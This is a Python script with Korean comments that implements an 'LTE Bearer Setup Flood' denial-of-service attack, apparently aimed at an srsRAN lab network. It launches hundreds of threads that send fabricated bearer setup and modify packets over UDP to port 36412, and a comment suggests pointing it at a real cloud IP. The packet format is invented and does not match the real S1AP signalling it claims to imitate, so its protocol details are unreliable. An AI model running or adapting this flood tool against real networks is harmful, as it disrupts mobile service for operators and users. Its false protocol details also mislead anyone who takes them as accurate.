#!/usr/bin/env python3
"""
LTE Bearer Setup Flood Attack
srsRAN 환경에서 대량의 Bearer 설정 요청을 전송하여 네트워크 리소스를 고갈시키는 공격
"""

import socket
import struct
import time
import threading
import random

class BearerSetupFlood:
    def __init__(self, target_ip, target_port=36412, num_ues=500):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_ues = num_ues
        self.attack_threads = []
        self.running = False
        
    def generate_ue_id(self):
        """임의의 UE ID 생성"""
        return random.randint(1, 4294967295)  # 32비트 unsigned int 범위
    
    def generate_bearer_id(self):
        """임의의 Bearer ID 생성"""
        return random.randint(1, 15)
    
    def create_bearer_setup_request(self, ue_id, bearer_id):
        """Bearer Setup Request 메시지 생성"""
        # 간단한 Bearer Setup Request 구조
        bearer_msg = struct.pack('>I', 0x12345678)  # Message Header
        bearer_msg += struct.pack('>H', 0x0003)     # Message Type (Bearer Setup)
        bearer_msg += struct.pack('>I', ue_id)      # UE ID
        bearer_msg += struct.pack('>B', bearer_id)  # Bearer ID
        bearer_msg += struct.pack('>B', 0x01)       # QoS Class Identifier
        bearer_msg += struct.pack('>I', 0x00000001) # Guaranteed Bit Rate
        bearer_msg += struct.pack('>I', 0x00000002) # Maximum Bit Rate
        return bearer_msg
    
    def create_bearer_modify_request(self, ue_id, bearer_id):
        """Bearer Modify Request 메시지 생성"""
        bearer_msg = struct.pack('>I', 0x12345678)  # Message Header
        bearer_msg += struct.pack('>H', 0x0004)     # Message Type (Bearer Modify)
        bearer_msg += struct.pack('>I', ue_id)      # UE ID
        bearer_msg += struct.pack('>B', bearer_id)  # Bearer ID
        bearer_msg += struct.pack('>B', 0x02)       # QoS Class Identifier
        bearer_msg += struct.pack('>I', 0x00000003) # Guaranteed Bit Rate
        bearer_msg += struct.pack('>I', 0x00000004) # Maximum Bit Rate
        return bearer_msg
    
    def send_bearer_requests(self, ue_id, duration=60):
        """Bearer 요청 메시지 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start_time = time.time()
        
        request_types = ['setup', 'modify']
        
        while self.running and (time.time() - start_time) < duration:
            try:
                req_type = random.choice(request_types)
                bearer_id = self.generate_bearer_id()
                
                if req_type == 'setup':
                    bearer_packet = self.create_bearer_setup_request(ue_id, bearer_id)
                else:  # modify
                    bearer_packet = self.create_bearer_modify_request(ue_id, bearer_id)
                
                # Bearer 메시지 전송
                sock.sendto(bearer_packet, (self.target_ip, self.target_port))
                
                # 랜덤 간격으로 전송
                time.sleep(random.uniform(0.1, 0.8))
                
            except Exception as e:
                print(f"UE {ue_id} Bearer 전송 오류: {e}")
                break
        
        sock.close()
    
    def start_attack(self, duration=60):
        """공격 시작"""
        print(f"Bearer Setup Flood 공격 시작...")
        print(f"대상: {self.target_ip}:{self.target_port}")
        print(f"UE 수: {self.num_ues}")
        print(f"지속 시간: {duration}초")
        
        self.running = True
        
        # 각 UE에 대해 별도 스레드 생성
        for i in range(self.num_ues):
            ue_id = self.generate_ue_id()
            thread = threading.Thread(
                target=self.send_bearer_requests,
                args=(ue_id, duration)
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
            time.sleep(0.01)
        
        print(f"{self.num_ues}개 UE 스레드 시작됨")
        
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("공격 중지 중...")
        self.running = False
        
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        print("공격 완료")

def main():
    # 공격 대상 설정
    target_ip = "127.0.0.1"  # 클라우드 환경에서는 실제 IP로 변경
    target_port = 36412
    
    # 공격 파라미터
    num_ues = 200
    duration = 120
    
    attack = BearerSetupFlood(target_ip, target_port, num_ues)
    
    try:
        attack.start_attack(duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
